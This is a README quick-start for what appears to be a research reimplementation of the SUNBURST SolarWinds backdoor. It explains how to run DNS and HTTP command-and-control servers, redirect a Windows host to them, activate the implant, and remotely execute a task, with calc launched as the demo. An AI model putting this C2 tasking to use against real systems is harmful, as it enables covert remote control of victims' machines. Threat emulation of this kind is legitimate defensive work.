Quick start:

0. Install python packages in requirements_dns.txt and requirements_http.txt
1. Run sunburst_dnsc2.py on a server (local or remote)
2. Type "auto_activate" in the DNS c2 shell and hit enter. Upon connection, clients ("sunbeams") will under go the activation process
3. Run sunburst_httpc2.py on a server (local or remote)
4. Set Window's DNS server to the IP address of the server running sunburst_dnsc2.py
5. Edit Window's HOST file to point "mysunbursthttpc2server.com" to the IP address of the server running sunburst_httpc2.py
6. Compile the Visual Studio solution
7. Run SolarWinds.BusinessLayerHost.exe
8. Wait 30-60 seconds
9. SolarWinds.BusinessLayerHost.exe will connect to the DNS C2 server.
```
(sunburst) auto_activate
	Sunbeams will begin activation when they first connect
(sunburst) (09:14:28) [*] New sunbeam found: b'4f4774e0740a7e72'
(09:14:28) [*] sunbeam preactivated (activation step 1/2): b'4f4774e0740a7e72'
(09:14:38) [*] sunbeam activated (activation step 2/2): b'4f4774e0740a7e72'
```
10. SolarWinds.BusinessLayerHost.exe will connect to the HTTP C2 server.
```
(sunburst) (09:14:40) [*] New sunbeam found: b'4f4774e0740a7e72'
```
11. Type "execute 4f4774e0740a7e72 5 calc" in the HTTP C2 shell and hit enter.
12. Upon the next HTTP request & response, SolarWinds.BusinessLayerHost.exe will execute the RunTask job (id=5) and launch calc.
